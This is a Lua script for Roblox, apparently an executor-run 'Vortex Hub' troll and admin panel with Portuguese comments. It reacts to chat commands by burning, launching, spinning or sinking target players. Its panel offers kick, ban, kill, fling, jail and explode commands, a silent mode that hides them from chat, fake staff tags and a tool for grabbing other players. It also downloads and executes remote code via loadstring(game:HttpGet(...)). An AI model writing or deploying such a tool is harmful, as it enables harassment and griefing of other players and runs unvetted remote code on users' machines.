    if msgLower:match("^;burn%s+" .. targetLower) then
        if character and root then
            local fire = Instance.new("Fire")
            fire.Size = 12
            fire.Heat = 15
            fire.Parent = root
            task.delay(8, function()
                if fire then fire:Destroy() end
            end)
            if humanoid then
                task.spawn(function()
                    for i = 1, 10 do
                        task.wait(0.6)
                        if humanoid and humanoid.Parent then
                            humanoid:TakeDamage(8)
                        end
                    end
                end)
            end
        end
    end

    if msgLower:match("^;rocket%s+" .. targetLower) then
        if root then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(0, 250, 0)
            bv.MaxForce = Vector3.new(0, 1e6, 0)
            bv.Parent = root
            Debris:AddItem(bv, 2)
        end
    end

    if msgLower:match("^;spin%s+" .. targetLower) then
        if root then
            local spin = Instance.new("BodyAngularVelocity")
            spin.AngularVelocity = Vector3.new(0, 40, 0)
            spin.MaxTorque = Vector3.new(0, 1e6, 0)
            spin.Parent = root
            Debris:AddItem(spin, 6)
        end
    end

    if msgLower:match("^;sink%s+" .. targetLower) then
        if root then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(0, -80, 0)
            bv.MaxForce = Vector3.new(0, 1e6, 0)
            bv.Parent = root
            Debris:AddItem(bv, 4)
        end
    end
end

-- Escuta de chat
for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
    if ch:IsA("TextChannel") then
        ch.MessageReceived:Connect(function(msg)
            if msg.Text and msg.TextSource then
                ProcessarMensagem(msg.Text, msg.TextSource.Name)
            end
        end)
    end
end

TextChatService.TextChannels.ChildAdded:Connect(function(ch)
    if ch:IsA("TextChannel") then
        ch.MessageReceived:Connect(function(msg)
            if msg.Text and msg.TextSource then
                ProcessarMensagem(msg.Text, msg.TextSource.Name)
            end
        end)
    end
end)

-- =============================================================================
-- PAINEL ADM
-- =============================================================================
if not EstaAutorizado(LocalPlayer.Name) then
    return
end

local ok, WindUILib = pcall(function()
    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
end)
if not ok then return end

local AdminWindow = WindUILib:CreateWindow({
    Title = "Vortex Hub | Admin painel",
    Icon = "door-open",
    Author = "by: Cafezin and vitinwz22",
    Folder = "Fx - Admins",
    Size = UDim2.fromOffset(580, 460),
    Transparent = true,
    Theme = "Midnight",
    Resizable = true,
    SideBarWidth = 200,
    BackgroundImageTransparency = 0.42,
    HideSearchBar = true,
    ScrollBarEnabled = true,
})

local TabComandos = AdminWindow:Tab({ Title = "Admin", Icon = "terminal" })
local Section = TabComandos:Section({ Title = "Commands", Icon = "user-cog", Opened = true })

local function getPlayersList()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(t, p.Name)
    end
    return t
end

local TargetName
local Dropdown = Section:Dropdown({
    Title = "Selecionar Jogador",
    Values = getPlayersList(),
    Value = "",
    Callback = function(opt)
        TargetName = opt
    end
})

Players.PlayerAdded:Connect(function()
    Dropdown:SetValues(getPlayersList())
end)
Players.PlayerRemoving:Connect(function()
    Dropdown:SetValues(getPlayersList())
end)

local razaoPunicao = ""
Section:Input({
    Title = "Mensagem de Kick / Ban",
    Placeholder = "Digite o motivo aqui...",
    Callback = function(text)
        razaoPunicao = text
    end
})

Section:Toggle({
    Title = "Modo Silencioso",
    Desc = "Executa os comandos sem aparecer no chat",
    Default = false,
    Callback = function(value)
        SilentMode = value
    end
})

local comandos = {
    "bring", "tp", "kick", "ban", "kill", "killplus", "fling",
    "backrooms", "freeze", "unfreeze", "jail", "unjail",
    "monster", "explode", "burn", "rocket", "spin", "sink", "verifique"
}

for _, cmd in ipairs(comandos) do
    Section:Button({
        Title = cmd:lower(),
        Desc = "Script for ;" .. cmd .. " - Target",
        Callback = function()
            if cmd == "verifique" then
                EnviarComando("Fx_users", "")
                return
            end

            if not TargetName or TargetName == "" then
                warn("Nenhum jogador selecionado!")
                return
            end

            if SilentMode then
                local msg = ";" .. cmd .. " " .. TargetName
                if razaoPunicao and razaoPunicao ~= "" then
                    msg = msg .. " " .. razaoPunicao
                end
                ProcessarMensagem(msg, LocalPlayer.Name)
            else
                EnviarComando(cmd, TargetName, razaoPunicao)
            end
        end
    })
end

-- ABA AVISOS
local TabAvisos = AdminWindow:Tab({ Title = "Avisos", Icon = "megaphone" })
local SecAvisos = TabAvisos:Section({ Title = "Painel de Anúncios Globais", Icon = "bell", Opened = true })

local textoAvisoDigitado = ""
SecAvisos:Input({
    Title = "Texto do Aviso",
    Placeholder = "Escreva o comunicado aqui...",
    Callback = function(text)
        textoAvisoDigitado = text
    end
})

SecAvisos:Button({
    Title = "📢 Enviar Aviso Global",
    Desc = "Mostra sua foto de perfil e o aviso no topo da tela de todos.",
    Callback = function()
        if textoAvisoDigitado and textoAvisoDigitado ~= "" then
            EnviarComando("aviso", textoAvisoDigitado)
        else
            warn("Digite um texto para o aviso!")
        end
    end
})

-- ABA TAGS
local TabTag = AdminWindow:Tab({ Title = "Tags", Icon = "tag" })
local SecTag = TabTag:Section({ Title = "Gerenciar Tags", Icon = "tag", Opened = true })

local tagSelecionada = "DONO"
local corSelecionada = Color3.fromRGB(255, 215, 0)

SecTag:Dropdown({
    Title = "Escolher tipo de Tag",
    Values = { "DONO", "TESTER", "MODERADOR", "DIVULGADOR", "DEV" },
    Value = "DONO",
    Callback = function(v)
        tagSelecionada = v
        if v == "DONO" then
            corSelecionada = Color3.fromRGB(255, 215, 0)
        elseif v == "TESTER" then
            corSelecionada = Color3.fromRGB(100, 200, 255)
        elseif v == "MODERADOR" then
            corSelecionada = Color3.fromRGB(0, 255, 128)
        elseif v == "DIVULGADOR" then
            corSelecionada = Color3.fromRGB(255, 100, 180)
        elseif v == "DEV" then
            corSelecionada = Color3.fromRGB(180, 100, 255)
        end
    end
})

SecTag:Button({
    Title = "Adicionar Tag",
    Desc = "Adiciona a tag selecionada acima da sua cabeça",
    Callback = function()
        CriarTag(LocalPlayer, tagSelecionada, corSelecionada)
    end
})

SecTag:Button({
    Title = "Remover Tag",
    Desc = "Remove sua tag atual",
    Callback = function()
        RemoverTag(LocalPlayer)
    end
})

-- ==================== ABA TROLL ====================
local TabTroll = AdminWindow:Tab({ Title = "Troll", Icon = "smile" })
local SecTroll = TabTroll:Section({ Title = "Ferramentas de Troll", Icon = "hand", Opened = true })

SecTroll:Button({
    Title = "Pegar Jogadores",
    Desc = "Clica na pessoa pra segurar, clica de novo pra soltar",
    Callback = function()
        DarItemPegar()
    end
})

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://8486683243"
sound.Volume = 0.5
sound.PlayOnRemove = true
sound.Parent = Workspace
sound:Destroy()
